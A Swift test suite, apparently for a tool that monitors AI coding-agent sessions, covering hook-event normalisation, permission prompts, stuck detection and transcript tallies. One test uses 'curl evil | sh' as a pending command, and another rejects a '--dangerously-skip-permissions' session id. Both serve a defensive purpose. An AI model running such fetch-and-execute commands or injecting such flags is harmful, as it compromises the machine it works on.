import Foundation
import Testing
@testable import YaaCore

private let t0 = Date(timeIntervalSince1970: 1_000_000)

private func claude(_ event: String, _ fields: [String: JSONValue] = [:], at: TimeInterval = 0) -> HookEnvelope {
    var p: [String: JSONValue] = ["session_id": .string("s1"), "cwd": .string("/tmp/proj"), "hook_event_name": .string(event)]
    p.merge(fields) { $1 }
    return HookEnvelope(agent: .claudeCode, event: event, receivedAt: t0.addingTimeInterval(at), agentPid: 42,
                        terminal: TerminalContext(termProgram: "waveterm", waveBlockId: "b1", waveTabId: "t1"),
                        payload: .object(p))
}

private func fold(_ envs: [HookEnvelope], into s: SessionState? = nil) -> SessionState {
    var state = s
    for e in envs { for ev in Normalizer.normalize(e) { state = SessionReducer.apply(ev, to: state) } }
    return state!
}

@Suite struct ClaudeFlow {
    @Test func promptToolStop() {
        let s = fold([
            claude("SessionStart"),
            claude("UserPromptSubmit", ["prompt": .string("fix the build")], at: 1),
            claude("PreToolUse", ["tool_name": .string("Bash"), "tool_use_id": .string("u1"),
                                  "tool_input": .object(["command": .string("make test\nmore")])], at: 2),
        ])
        #expect(s.status == .running)
        #expect(s.title == "fix the build")
        #expect(s.latestTool?.summary == "make test")
        #expect(s.latestTool?.isRunning == true)
        #expect(s.terminal?.waveBlockId == "b1")
        #expect(s.agentPid == 42)

        let done = fold([
            claude("PostToolUse", ["tool_name": .string("Bash"), "tool_use_id": .string("u1"),
                                   "tool_response": .object(["stdout": .string("ok")])], at: 3),
            claude("Stop", ["last_assistant_message": .string("All green.")], at: 4),
        ], into: s)
        #expect(done.status == .idle)
        #expect(done.tools.count == 1)
        #expect(done.tools[0].isRunning == false)
        #expect(done.turns.last?.lastMessage == "All green.")
        #expect(done.turns.last?.toolCount == 1)
        #expect(Alerts.between(s, done) == .done("All green."))
    }

    @Test func permissionThenResume() {
        let pre = fold([
            claude("UserPromptSubmit", ["prompt": .string("x")]),
            claude("PreToolUse", ["tool_name": .string("Bash"), "tool_use_id": .string("u1"),
                                  "tool_input": .object(["command": .string("rm -rf build")])], at: 1),
        ])
        let asked = fold([claude("PermissionRequest", ["tool_name": .string("Bash"), "tool_use_id": .string("u1"),
                                                      "tool_input": .object(["command": .string("rm -rf build")]),
                                                      Normalizer.awaitingKey: .bool(true)], at: 2)], into: pre)
        #expect(asked.status == .needsInput)
        #expect(asked.pendingPermission?.awaitingDecision == true)
        #expect(asked.needsInputMessage == "Bash: rm -rf build")
        #expect(Alerts.between(pre, asked) == .needsInput("Bash: rm -rf build"))

        let resumed = fold([claude("PostToolUse", ["tool_name": .string("Bash"), "tool_use_id": .string("u1")], at: 3)], into: asked)
        #expect(resumed.status == .running)
        #expect(resumed.pendingPermission == nil)
    }

    @Test func askUserQuestionNeedsInput() {
        let s = fold([
            claude("UserPromptSubmit", ["prompt": .string("x")]),
            claude("PreToolUse", ["tool_name": .string("AskUserQuestion"), "tool_use_id": .string("q"),
                                  "tool_input": .object(["questions": .array([.object(["question": .string("Which DB?")])])])], at: 1),
        ])
        #expect(s.status == .needsInput)
        #expect(s.needsInputMessage == "Which DB?")
    }

    @Test func idlePromptNotificationIgnored() {
        let idle = fold([claude("UserPromptSubmit", ["prompt": .string("x")]), claude("Stop", [:], at: 1)])
        let after = fold([claude("Notification", ["notification_type": .string("idle_prompt"), "message": .string("waiting")], at: 61)], into: idle)
        #expect(after.status == .idle)
    }

    @Test func subagentsFoldUnderParent() {
        let s = fold([
            claude("UserPromptSubmit", ["prompt": .string("x")]),
            claude("SubagentStart", ["agent_id": .string("a1"), "agent_type": .string("Explore")], at: 1),
            claude("PreToolUse", ["agent_id": .string("a1"), "tool_name": .string("Read"), "tool_use_id": .string("r"),
                                  "tool_input": .object(["file_path": .string("/x/y.swift")])], at: 2),
        ])
        #expect(s.subagents.map(\.id) == ["a1"])
        #expect(s.latestTool?.subagentId == "a1")
        let stopped = fold([claude("SubagentStop", ["agent_id": .string("a1")], at: 3)], into: s)
        #expect(stopped.subagents.isEmpty)
        #expect(stopped.runningTools.isEmpty)
        #expect(stopped.status == .running)
    }

    @Test func toolWithoutIdMatchesAcrossProcesses() {
        let input: JSONValue = .object(["command": .string("ls")])
        let s = fold([
            HookEnvelope(agent: .cursor, event: "preToolUse", receivedAt: t0,
                         payload: .object(["conversation_id": .string("c"), "hook_event_name": .string("preToolUse"),
                                           "tool_name": .string("Shell"), "tool_input": input])),
            HookEnvelope(agent: .cursor, event: "postToolUse", receivedAt: t0.addingTimeInterval(1),
                         payload: .object(["conversation_id": .string("c"), "hook_event_name": .string("postToolUse"),
                                           "tool_name": .string("Shell"), "tool_input": input])),
        ])
        #expect(s.tools.count == 1)
        #expect(s.runningTools.isEmpty)
    }

    @Test func outputIsClipped() {
        let big = String(repeating: "a", count: 5000)
        let s = fold([
            claude("PreToolUse", ["tool_name": .string("Bash"), "tool_use_id": .string("u")]),
            claude("PostToolUse", ["tool_name": .string("Bash"), "tool_use_id": .string("u"), "tool_response": .string(big)], at: 1),
        ])
        #expect(s.tools[0].output!.count == SessionReducer.outputLimit + 1)
    }
}

@Suite struct YaakPluginFlow {
    private func pi(_ event: String, _ f: [String: JSONValue] = [:], at: TimeInterval = 0) -> HookEnvelope {
        var p: [String: JSONValue] = ["session_id": .string("/s/pi.jsonl")]
        p.merge(f) { $1 }
        return HookEnvelope(agent: .pi, event: event, receivedAt: t0.addingTimeInterval(at), payload: .object(p))
    }

    @Test func piPromptAnsweredAndSettled() {
        let s = fold([
            pi("prompt", ["prompt": .string("hi")]),
            pi("tool_start", ["id": .string("t"), "tool": .string("bash"), "input": .object(["command": .string("ls")])], at: 1),
            pi("needs_input", ["message": .string("Pick one")], at: 2),
        ])
        #expect(s.status == .needsInput)
        let answered = fold([pi("input_answered", at: 3)], into: s)
        #expect(answered.status == .running)
        let done = fold([pi("tool_end", ["id": .string("t"), "tool": .string("bash")], at: 4), pi("turn_end", ["message": .string("done")], at: 5)], into: answered)
        #expect(done.status == .idle)
        #expect(done.turns.last?.lastMessage == "done")
    }

    @Test func replayedEventDoesNotReopenFinishedTurn() {
        let tool: [String: JSONValue] = ["id": .string("t"), "tool": .string("bash"), "input": .object(["command": .string("ls")])]
        let done = fold([pi("prompt", ["prompt": .string("hi")]), pi("tool_start", tool, at: 1),
                         pi("tool_end", tool, at: 2), pi("turn_end", at: 5)])
        // A spooled tool event from inside the turn, replayed after it ended.
        let late = fold([pi("tool_start", ["id": .string("u"), "tool": .string("bash")], at: 3),
                         pi("tool_end", ["id": .string("u"), "tool": .string("bash")], at: 4)], into: done)
        #expect(late.status == .idle)
        #expect(late.lastEventAt == done.lastEventAt)
        // The next prompt still starts a new turn.
        let next = fold([pi("prompt", ["prompt": .string("again")], at: 6)], into: late)
        #expect(next.status == .running)
    }

    @Test func piNameBecomesTitleWithoutCountingAsActivity() {
        let s = fold([pi("prompt", ["prompt": .string("fix the login bug please")])])
        #expect(s.title == "fix the login bug please")
        let named = fold([pi("title", ["title": .string("Login fix")], at: 400)], into: s)
        #expect(named.title == "Login fix")
        #expect(named.lastEventAt == s.lastEventAt)
        #expect(named.status == .running)
        let cleared = fold([pi("title", ["title": .null], at: 401)], into: named)
        #expect(cleared.title == "fix the login bug please")
        #expect(cleared.peek == nil)
    }
}

@Suite struct Stuck {
    let cfg = StuckConfig(silence: 300, toolDuration: 300)

    func running(tool: String? = nil, input: String = "{}", at: TimeInterval = 0, pid: Int32? = nil) -> SessionState {
        var s = SessionState(agent: .claudeCode, sessionId: "s", at: t0)
        s.status = .running
        s.hooked = true
        s.agentPid = pid
        s.lastEventAt = t0.addingTimeInterval(at)
        if let tool {
            s.tools = [ToolCall(id: "1", name: tool, summary: "", input: input, output: nil, isError: false, startedAt: t0.addingTimeInterval(at))]
        }
        return s
    }

    @Test func runningWithNothingAfterTurnEndIsFinished() {
        var s = running(at: 10)
        s.turns = [Turn(id: 1, prompt: "p", startedAt: t0, endedAt: t0.addingTimeInterval(10), toolCount: 0)]
        let out = StuckDetector.evaluate(s, now: t0.addingTimeInterval(20), config: cfg, isAlive: { _ in true })
        #expect(out?.status == .idle)
        #expect(out?.unreadSince == t0.addingTimeInterval(10))
        // Already looked at after it ended: reviewed.
        s.reviewedAt = t0.addingTimeInterval(15)
        #expect(StuckDetector.evaluate(s, now: t0.addingTimeInterval(20), config: cfg, isAlive: { _ in true })?.unreadSince == nil)
        // A later event means the session really is running again.
        s.lastEventAt = t0.addingTimeInterval(12)
        #expect(StuckDetector.evaluate(s, now: t0.addingTimeInterval(20), config: cfg, isAlive: { _ in true }) == nil)
    }

    @Test func silence() {
        let s = running()
        #expect(StuckDetector.evaluate(s, now: t0.addingTimeInterval(299), config: cfg, isAlive: { _ in true }) == nil)
        let out = StuckDetector.evaluate(s, now: t0.addingTimeInterval(301), config: cfg, isAlive: { _ in true })
        #expect(out?.status == .stuck)
        #expect(Alerts.between(s, out!) == .stuck("5 分钟无新事件"))
    }

    @Test func longTool() {
        let out = StuckDetector.evaluate(running(tool: "Bash"), now: t0.addingTimeInterval(400), config: cfg, isAlive: { _ in true })
        #expect(out?.stuckReason == "Bash 已运行 6 分钟")
    }

    @Test func backgroundToolIsNotStuck() {
        let bg = running(tool: "Bash", input: #"{"command":"sleep 999","run_in_background":true}"#)
        #expect(StuckDetector.evaluate(bg, now: t0.addingTimeInterval(4000), config: cfg, isAlive: { _ in true }) == nil)
        #expect(StuckDetector.evaluate(running(tool: "Monitor"), now: t0.addingTimeInterval(4000), config: cfg, isAlive: { _ in true }) == nil)
    }

    @Test func subagentCountsAsActivity() {
        var s = running()
        s.subagents = [Subagent(id: "a", type: nil, startedAt: t0)]
        #expect(StuckDetector.evaluate(s, now: t0.addingTimeInterval(4000), config: cfg, isAlive: { _ in true }) == nil)
    }

    @Test func deadProcess() {
        let out = StuckDetector.evaluate(running(pid: 7), now: t0.addingTimeInterval(1), config: cfg, isAlive: { _ in false })
        #expect(out?.stuckReason == "进程已退出")
        var idle = running(pid: 7)
        idle.status = .idle
        // A finished turn stays idle: the conversation is still there to reopen.
        #expect(StuckDetector.evaluate(idle, now: t0, config: cfg, isAlive: { _ in false }) == nil)
    }

    @Test func unhookedSessionsSkipSilence() {
        var s = running()
        s.hooked = false
        #expect(StuckDetector.evaluate(s, now: t0.addingTimeInterval(4000), config: cfg, isAlive: { _ in true }) == nil)
    }

    @Test func recovers() {
        var s = running(at: 1000)
        s.status = .stuck
        s.stuckReason = "x"
        #expect(StuckDetector.evaluate(s, now: t0.addingTimeInterval(1001), config: cfg, isAlive: { _ in true })?.status == .running)
    }
}

@Suite struct Summaries {
    @Test func variants() {
        #expect(ToolSummary.summarize(tool: "exec_command", input: .object(["cmd": .string("git status")])) == "git status")
        #expect(ToolSummary.summarize(tool: "shell", input: .object(["command": .array([.string("bash"), .string("-lc"), .string("ls")])])) == "bash -lc ls")
        #expect(ToolSummary.summarize(tool: "apply_patch", input: .object(["input": .string("*** Begin Patch\n*** Update File: a/b.swift\n")])) == "a/b.swift")
        #expect(ToolSummary.summarize(tool: "Grep", input: .object(["pattern": .string("foo")])) == "foo")
        #expect(ToolSummary.summarize(tool: "mcp__x__y", input: .object(["zeta": .string("z")])) == "z")
    }
}

@Suite struct Snapshots {
    @Test func snapshotDrivesUnhookedOnly() {
        let snap = AgentEvent(agent: .claudeCode, sessionId: "s1", at: t0, kind: .statusSnapshot(.running), agentPid: 9)
        let s = SessionReducer.apply(snap, to: nil)
        #expect(s.status == .running && !s.hooked && s.agentPid == 9)

        var hooked = fold([claude("UserPromptSubmit", ["prompt": .string("x")])])
        let busy = AgentEvent(agent: .claudeCode, sessionId: "s1", at: t0.addingTimeInterval(500), kind: .statusSnapshot(.running))
        hooked = SessionReducer.apply(busy, to: hooked)
        #expect(hooked.status == .running)
        #expect(hooked.lastEventAt == t0)
    }

    /// Esc in Claude fires no Stop; the session file going idle after our last event is the only signal.
    @Test func idleSnapshotEndsInterruptedHookedTurn() {
        let s = fold([
            claude("UserPromptSubmit", ["prompt": .string("x")]),
            claude("PreToolUse", ["tool_name": .string("Bash"), "tool_use_id": .string("u1"),
                                  "tool_input": .object(["command": .string("sleep 99")])], at: 1),
        ])
        let stale = SessionReducer.apply(AgentEvent(agent: .claudeCode, sessionId: "s1", at: t0, kind: .statusSnapshot(.idle)), to: s)
        #expect(stale.status == .running)
        let idle = SessionReducer.apply(AgentEvent(agent: .claudeCode, sessionId: "s1", at: t0.addingTimeInterval(30), kind: .statusSnapshot(.idle)), to: s)
        #expect(idle.status == .idle)
        #expect(idle.runningTools.isEmpty)
    }
}

@Suite struct ReviewRegressions {
    @Test func idlePromptEndsRunningTurnWithoutClobberingStop() {
        let running = fold([claude("UserPromptSubmit", ["prompt": .string("x")])])
        let idle = fold([claude("Notification", ["notification_type": .string("idle_prompt"), "message": .string("waiting")], at: 60)], into: running)
        #expect(idle.status == .idle)
        #expect(idle.needsInputMessage == nil)

        let stopped = fold([claude("Stop", ["last_assistant_message": .string("done")], at: 2)], into: running)
        let after = fold([claude("Notification", ["notification_type": .string("idle_prompt")], at: 60)], into: stopped)
        #expect(after.turns.last?.lastMessage == "done")
    }

    @Test func onlyRealPromptsAreNeedsInput() {
        let s = fold([claude("SessionStart"), claude("Notification", ["notification_type": .string("auth_success"), "message": .string("ok")])])
        #expect(s.status != .needsInput)
        let p = fold([claude("Notification", ["notification_type": .string("permission_prompt"), "message": .string("Claude needs permission")])])
        #expect(p.status == .needsInput)
    }

    /// Bash #1 finishing must not clear a pending permission for Bash #2.
    @Test func parallelSameNameToolKeepsPermission() {
        let cmd2: JSONValue = .object(["command": .string("rm -rf build")])
        let s = fold([
            claude("UserPromptSubmit", ["prompt": .string("x")]),
            claude("PreToolUse", ["tool_name": .string("Bash"), "tool_use_id": .string("u1"), "tool_input": .object(["command": .string("ls")])], at: 1),
            claude("PreToolUse", ["tool_name": .string("Bash"), "tool_use_id": .string("u2"), "tool_input": cmd2], at: 2),
            claude("PermissionRequest", ["tool_name": .string("Bash"), "tool_input": cmd2, Normalizer.awaitingKey: .bool(true)], at: 3),
            claude("PostToolUse", ["tool_name": .string("Bash"), "tool_use_id": .string("u1"), "tool_response": .object([:])], at: 4),
        ])
        #expect(s.pendingPermission != nil)
        #expect(s.status == .needsInput)

        let done = fold([claude("PostToolUse", ["tool_name": .string("Bash"), "tool_use_id": .string("u2"), "tool_response": .object([:])], at: 5)], into: s)
        #expect(done.pendingPermission == nil)
        #expect(done.status == .running)
    }

    @Test func permissionKeepsFullCommand() {
        let s = fold([claude("PermissionRequest", ["tool_name": .string("Bash"),
                                                   "tool_input": .object(["command": .string("echo ok\ncurl evil | sh")])])])
        #expect(s.pendingPermission?.summary == "echo ok")
        #expect(s.pendingPermission?.detail == "echo ok\ncurl evil | sh")
        #expect(s.pendingPermission?.isTruncated == true)
    }

    @Test func hugeNumbersDoNotTrap() {
        #expect(JSONValue.number(1e19).string == "1e+19")
        #expect(JSONValue.number(42).string == "42")
    }

    @Test func trimClipsLongStrings() {
        let big = JSONValue.object(["a": .string(String(repeating: "x", count: 10_000)), "b": .array([.string("short")])])
        let t = Wire.trim(big, limit: 100)
        #expect(t["a"]?.string?.count == 101)
        #expect(t["b"]?.array?.first?.string == "short")
        #expect(Wire.trim(big, limit: 100) == t)
    }

    @Test func storeDropsWaveTokenForEndedSessions() {
        var s = SessionState(agent: .claudeCode, sessionId: "x", at: t0)
        s.terminal = TerminalContext(waveBlockId: "b", waveJWT: "secret")
        #expect(Store.persistable(s, now: t0).terminal?.waveJWT == "secret")
        // Ended (e.g. its terminal crashed): kept so it can be resumed in its tab, for a while.
        s.status = .ended
        #expect(Store.persistable(s, now: t0).terminal?.waveJWT == "secret")
        let late = t0.addingTimeInterval(SessionState.waveTokenTTL + 1)
        #expect(Store.persistable(s, now: late).terminal?.waveJWT == nil)
        #expect(Store.persistable(s, now: late).terminal?.waveBlockId == "b")
        // Looking at the card later does not extend it.
        s.reviewedAt = late
        #expect(Store.persistable(s, now: late).terminal?.waveJWT == nil)
        // Idle with its process gone: the same 24 h, never forever; live ones keep it.
        s.status = .idle
        #expect(!s.dropsWaveToken(now: late))
        #expect(s.dropsWaveToken(now: late, gone: true))
        #expect(!s.dropsWaveToken(now: t0, gone: true))
        s.status = .ended
        // Ended by the user on the board: dropped at once.
        s.dismissedAt = t0
        #expect(Store.persistable(s, now: t0).terminal?.waveJWT == nil)
    }

    @Test func deadProcessLeavesFinishedSessionsAndDropsDeadWaits() {
        var s = SessionState(agent: .claudeCode, sessionId: "x", at: t0)
        s.agentPid = 42
        // Idle or ended: the card stays what it was; clicking it offers to reopen.
        #expect(StuckDetector.evaluate(s, now: t0, config: StuckConfig(), isAlive: { _ in false }) == nil)
        s.status = .ended
        #expect(StuckDetector.evaluate(s, now: t0, config: StuckConfig(), isAlive: { _ in false }) == nil)
        // Waiting on the user with nobody left to answer: back to idle.
        s.status = .needsInput
        s.needsInputMessage = "Bash: ls"
        s.needsInputSince = t0
        let out = StuckDetector.evaluate(s, now: t0, config: StuckConfig(), isAlive: { _ in false })!
        // No result came of it, so it is not waiting for review either.
        #expect(out.status == .idle && out.needsInputMessage == nil && out.needsInputSince == nil && out.unreadSince == nil)
        #expect(StuckDetector.evaluate(s, now: t0, config: StuckConfig(), isAlive: { _ in true }) == nil)
    }

    @Test func resumeCommandPerAgent() {
        func cmd(_ a: AgentKind, _ id: String) -> String? { SessionState(agent: a, sessionId: id, at: t0).resumeCommand }
        #expect(cmd(.claudeCode, "abc") == "claude --resume 'abc'")
        #expect(cmd(.codex, "abc") == "codex resume 'abc'")
        #expect(cmd(.opencode, "ses_1") == "opencode --session 'ses_1'")
        #expect(cmd(.pi, "/s/it's.jsonl") == "pi --session '/s/it'\\''s.jsonl'")
        #expect(cmd(.gemini, "abc") == "gemini --resume 'abc'")
        #expect(cmd(.copilot, "abc") == "copilot --resume 'abc'")
        #expect(cmd(.claudeCode, "") == nil)
        #expect(cmd(.claudeCode, "--dangerously-skip-permissions") == nil)
    }
}

@Suite struct ReviewState {
    @Test func finishedTurnIsUnreadUntilNextPrompt() {
        let done = fold([claude("UserPromptSubmit", ["prompt": .string("x")]), claude("Stop", [:], at: 1)])
        #expect(done.display == .review)
        #expect(done.unreadSince == t0.addingTimeInterval(1))
        let next = fold([claude("UserPromptSubmit", ["prompt": .string("y")], at: 2)], into: done)
        #expect(next.unreadSince == nil)
        #expect(next.display == .running)
        let ended = fold([claude("Stop", [:], at: 3), claude("SessionEnd", [:], at: 4)], into: next)
        #expect(ended.unreadSince == nil)
    }

    @Test func unhookedBusyToIdleIsUnread() {
        func snap(_ st: SessionStatus, _ at: TimeInterval) -> AgentEvent {
            AgentEvent(agent: .claudeCode, sessionId: "u", at: t0.addingTimeInterval(at), kind: .statusSnapshot(st))
        }
        var s = SessionReducer.apply(snap(.idle, 0), to: nil)
        #expect(s.display == .done)
        s = SessionReducer.apply(snap(.running, 1), to: s)
        s = SessionReducer.apply(snap(.idle, 2), to: s)
        #expect(s.display == .review)
        s = SessionReducer.apply(snap(.running, 3), to: s)
        #expect(s.unreadSince == nil)
    }

    @Test func oldStoredStateDecodes() throws {
        var s = SessionState(agent: .codex, sessionId: "o", at: t0)
        s.status = .idle
        var obj = try #require(JSONValue.parse(JSONEncoder().encode(s))?.object)
        obj["unreadSince"] = nil
        obj["peek"] = nil
        let back = try JSONDecoder().decode(SessionState.self, from: JSONEncoder().encode(JSONValue.object(obj)))
        #expect(back.display == .done)
    }
}

@Suite struct Transcript {
    private func lines(_ objs: [String]) -> Data { objs.joined(separator: "\n").data(using: .utf8)! }

    @Test func readsPromptReplyAndRecap() {
        let peek = TranscriptPeek.parse(lines([
            #"{"type":"user","message":{"role":"user","content":"old prompt"}}"#,
            #"{"type":"assistant","message":{"content":[{"type":"text","text":"old reply"}]}}"#,
            #"{"type":"system","subtype":"away_summary","content":"Goal: train v5."}"#,
            #"{"type":"user","message":{"role":"user","content":"why so slow?"}}"#,
            #"{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Bash"}]}}"#,
            #"{"type":"user","message":{"content":[{"type":"tool_result","content":"ok"}]}}"#,
            #"{"type":"assistant","isSidechain":true,"message":{"content":[{"type":"text","text":"sub"}]}}"#,
            #"{"type":"assistant","message":{"content":[{"type":"text","text":"Use AMP."}]}}"#,
        ]))
        #expect(peek?.lastPrompt == "why so slow?")
        #expect(peek?.lastReply == "Use AMP.")
        #expect(peek?.recap == "Goal: train v5.")
    }

    @Test func replyBeforeLatestPromptIsDropped() {
        let peek = TranscriptPeek.parse(lines([
            #"{"type":"assistant","message":{"content":[{"type":"text","text":"old"}]}}"#,
            #"{"type":"user","message":{"role":"user","content":"new question"}}"#,
            "not json",
        ]))
        #expect(peek?.lastPrompt == "new question")
        #expect(peek?.lastReply == nil)
        #expect(TranscriptPeek.parse(Data()) == nil)
    }

    @Test func titleFallsBackToPeek() {
        var s = SessionState(agent: .claudeCode, sessionId: "p", at: t0)
        s.cwd = "/x/LY-Analysis"
        #expect(s.title == "LY-Analysis")
        s.peek = TranscriptPeek(lastPrompt: "训练感觉很慢", lastReply: "加 AMP")
        #expect(s.title == "训练感觉很慢")
        #expect(s.lastReply == "加 AMP")
    }
}

@Suite struct AskUserQuestionFlow {
    /// Claude sends PreToolUse, then PermissionRequest, then a generic Notification for a question.
    @Test func questionIsNotShownAsPermission() {
        let input: JSONValue = .object(["questions": .array([.object(["question": .string("TEC 驱动选哪种？")]),
                                                             .object(["question": .string("MCU？")])])])
        let s = fold([
            claude("UserPromptSubmit", ["prompt": .string("x")]),
            claude("PreToolUse", ["tool_name": .string("AskUserQuestion"), "tool_use_id": .string("q1"), "tool_input": input], at: 1),
            claude("PermissionRequest", ["tool_name": .string("AskUserQuestion"), "tool_input": input,
                                         Normalizer.awaitingKey: .bool(true)], at: 1),
            claude("Notification", ["notification_type": .string("permission_prompt"),
                                    "message": .string("Claude needs your permission")], at: 2),
        ])
        #expect(s.status == .needsInput)
        #expect(s.pendingPermission == nil)
        #expect(s.needsInputMessage == "TEC 驱动选哪种？（共 2 个问题）")
    }

    @Test func genericNoticeStillFlagsOtherwise() {
        let s = fold([claude("UserPromptSubmit", ["prompt": .string("x")]),
                      claude("Notification", ["message": .string("Claude needs your permission")], at: 1)])
        #expect(s.status == .needsInput)
        #expect(s.needsInputMessage == "Claude needs your permission")
    }
}

@Suite struct BoardLayout {
    private func s(_ id: String, _ dir: String, _ start: TimeInterval) -> SessionState {
        var x = SessionState(agent: .claudeCode, sessionId: id, at: t0.addingTimeInterval(start))
        x.projectDir = dir
        x.cwd = dir + "/sub"
        x.status = .running
        return x
    }

    private func ids(_ l: [SessionState], _ order: [String] = []) -> [String] {
        Board.ordered(l, manualOrder: order).map(\.sessionId)
    }

    @Test func startOrderNoGrouping() {
        let list = [s("c", "/p/B", 3), s("a", "/p/A", 1), s("b", "/p/B", 2), s("d", "/p/A", 4)]
        #expect(ids(list) == ["a", "b", "c", "d"])
    }

    @Test func manualOrderWinsAndNewcomersAppend() {
        let list = [s("a", "/A", 1), s("b", "/B", 2), s("c", "/C", 3)]
        let flat = Board.ordered(list, manualOrder: []).map(\.id)
        let order = Board.move(["claude-code:c"], before: "claude-code:a", board: flat, manualOrder: ["claude-code:gone"])
        #expect(order == ["claude-code:c", "claude-code:a", "claude-code:b", "claude-code:gone"])
        #expect(ids(list + [s("n", "/N", 0)], order) == ["c", "a", "b", "n"])
        #expect(Board.move(["claude-code:c"], before: nil, board: flat, manualOrder: []).last == "claude-code:c")
    }

    @Test func statusTiersComeFirst() {
        var r = s("r", "/R", 1); r.status = .running
        var v = s("v", "/V", 2); v.status = .idle; v.unreadSince = t0
        var d = s("d", "/D", 0); d.status = .idle
        var a = s("a", "/A", 3); a.status = .needsInput
        var r2 = s("r2", "/V", 4); r2.status = .running
        #expect(ids([r, v, d, a, r2]) == ["a", "v", "r", "r2", "d"])
        // Manual order still decides within a tier.
        var r3 = s("r3", "/R3", 5); r3.status = .running
        #expect(ids([r, r3], ["claude-code:r3"]) == ["r3", "r"])
    }

    @Test func finishedSessionsFreshestFirst() {
        func done(_ id: String, event: TimeInterval, click: TimeInterval?) -> SessionState {
            var x = s(id, "/" + id, 0)
            x.status = .idle
            x.unreadSince = t0
            x.lastEventAt = t0.addingTimeInterval(event)
            x.reviewedAt = click.map { t0.addingTimeInterval($0) }
            return x
        }
        let old = done("old", event: 10, click: nil)
        let new = done("new", event: 20, click: nil)
        let clicked = done("clicked", event: 5, click: 30)
        // A click makes a session fresh again; manual order does not override freshness here.
        #expect(ids([old, new, clicked], ["claude-code:old"]) == ["clicked", "new", "old"])
        var seen = done("seen", event: 1, click: 40); seen.unreadSince = nil
        var seen2 = done("seen2", event: 50, click: nil); seen2.unreadSince = nil
        #expect(ids([seen, seen2, old]) == ["old", "seen2", "seen"])
    }

    @Test func pinnedSitAboveEveryStatus() {
        var w = s("w", "/W", 1); w.status = .needsInput
        var f = s("f", "/F", 2); f.status = .idle
        let r = s("r", "/R", 3)
        #expect(ids([w, f, r]) == ["w", "r", "f"])
        // Newest pin first, then the usual order.
        #expect(Board.ordered([w, f, r], manualOrder: [], pinned: ["claude-code:r", "claude-code:f"]).map(\.sessionId) == ["r", "f", "w"])
    }

    @Test func customNameWinsTitle() {
        var x = s("x", "/X", 0)
        x.peek = TranscriptPeek(); x.peek?.title = "agent title"
        #expect(x.title == "agent title")
        x.customName = "我的名字"
        #expect(x.title == "我的名字")
        x.customName = ""
        #expect(x.title == "agent title")
    }

    @Test func groupFollowsStartDirNotCd() {
        let e = AgentEvent(agent: .claudeCode, sessionId: "x", at: t0, kind: .sessionStart, cwd: "/p/A")
        var st = SessionReducer.apply(e, to: nil)
        st = SessionReducer.apply(AgentEvent(agent: .claudeCode, sessionId: "x", at: t0, kind: .sessionStart, cwd: "/p/A/deep"), to: st)
        #expect(st.projectName == "A")
    }
}

@Suite struct Titles {
    @Test func agentTitleThenFirstPromptLine() {
        let lines = [#"{"type":"ai-title","aiTitle":"跨 harness 监控托盘"}"#, #"{"type":"custom-title","customTitle":"我的名字"}"#,
                     #"{"type":"ai-title","aiTitle":"newer ai"}"#].joined(separator: "\n")
        #expect(TranscriptPeek.titles(Data(lines.utf8)) == "我的名字")
        var x = SessionState(agent: .claudeCode, sessionId: "t", at: t0)
        x.turns = [Turn(id: 1, prompt: "修一下登录页的样式问题\n第二行细节", startedAt: t0, toolCount: 0)]
        #expect(x.title == "修一下登录页的样式问题")
        x.peek = TranscriptPeek(title: "登录页样式")
        #expect(x.title == "登录页样式")
    }
}

@Suite struct UsageTallies {
    private func tmp(_ s: String) -> URL {
        let u = FileManager.default.temporaryDirectory.appendingPathComponent("yaak-tally-\(UUID().uuidString).jsonl")
        try? Data(s.utf8).write(to: u)
        return u
    }

    @Test func claudeDedupesMessageUsageAndTracksReply() throws {
        let lines = [
            #"{"type":"user","message":{"role":"user","content":"做点事"}}"#,
            #"{"type":"assistant","message":{"id":"m1","content":[{"type":"text","text":"先看看"}],"usage":{"input_tokens":10,"cache_read_input_tokens":100,"cache_creation_input_tokens":5,"output_tokens":3}}}"#,
            #"{"type":"assistant","message":{"id":"m1","content":[{"type":"tool_use","id":"t1","name":"Bash","input":{}}],"usage":{"input_tokens":10,"cache_read_input_tokens":100,"cache_creation_input_tokens":5,"output_tokens":3}}}"#,
            #"{"type":"user","message":{"role":"user","content":[{"type":"tool_result","tool_use_id":"t1","content":"ok"}]}}"#,
            #"{"type":"assistant","isSidechain":true,"message":{"id":"s1","content":[{"type":"text","text":"side"}],"usage":{"input_tokens":999,"output_tokens":999}}}"#,
            #"{"type":"assistant","message":{"id":"m2","content":[{"type":"text","text":"做完了"}],"usage":{"input_tokens":2,"cache_read_input_tokens":120,"cache_creation_input_tokens":0,"output_tokens":7}}}"#,
        ]
        let url = tmp(lines.joined(separator: "\n") + "\n")
        var t = TranscriptTally(format: .claude)
        let first = t.update(from: url)
        #expect(first)
        #expect(t.usage.input == 12 && t.usage.output == 10 && t.usage.cacheRead == 220 && t.usage.cacheWrite == 5)
        #expect(t.usage.context == 122)
        #expect(t.usage.toolCalls == 1 && t.usage.tools["Bash"] == 1)
        #expect(t.lastReply == "做完了")
        // A partial line waits; a new prompt clears the reply.
        let h = try FileHandle(forWritingTo: url)
        h.seekToEndOfFile()
        h.write(Data(#"{"type":"user","message":{"role":"user","content":"下一个"}}"#.utf8))
        let partial = t.update(from: url)
        #expect(!partial)
        h.write(Data("\n".utf8))
        try h.close()
        let rest = t.update(from: url)
        #expect(rest)
        #expect(t.lastReply == nil && t.usage.output == 10)
    }

    @Test func codexCumulativeTokensAndReply() {
        let lines = [
            #"{"type":"event_msg","payload":{"type":"task_started"}}"#,
            #"{"type":"response_item","payload":{"type":"function_call","name":"exec_command","arguments":"{}"}}"#,
            #"{"type":"response_item","payload":{"type":"message","role":"assistant","content":[{"type":"output_text","text":"结论在这"}]}}"#,
            #"{"type":"event_msg","payload":{"type":"token_count","info":{"total_token_usage":{"input_tokens":1000,"cached_input_tokens":800,"output_tokens":50},"last_token_usage":{"input_tokens":300},"model_context_window":258400}}}"#,
        ]
        var t = TranscriptTally(format: .codex)
        t.consume(Data(lines.joined(separator: "\n").utf8))
        #expect(t.usage.input == 200 && t.usage.cacheRead == 800 && t.usage.output == 50)
        #expect(t.usage.context == 300 && t.usage.contextWindow == 258400)
        #expect(t.usage.toolCalls == 1 && t.lastReply == "结论在这")
        t.consume(Data(#"{"type":"event_msg","payload":{"type":"task_started"}}"#.utf8))
        #expect(t.lastReply == nil)
    }

    @Test func newPromptDropsStaleReply() {
        var s = SessionState(agent: .claudeCode, sessionId: "r", at: t0)
        s.peek = TranscriptPeek(lastReply: "旧回复", title: "T")
